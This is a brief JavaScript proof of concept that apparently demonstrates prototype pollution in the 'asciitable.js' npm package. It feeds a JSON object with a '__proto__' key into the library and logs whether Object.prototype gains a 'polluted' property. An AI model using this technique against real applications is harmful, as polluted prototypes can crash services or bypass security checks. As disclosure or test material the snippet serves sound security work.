var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const req = require('asciitable.js');
const b = JSON.parse('{"__proto__":{"polluted":"yes"}}');
req(obj, b);
console.log({}.polluted);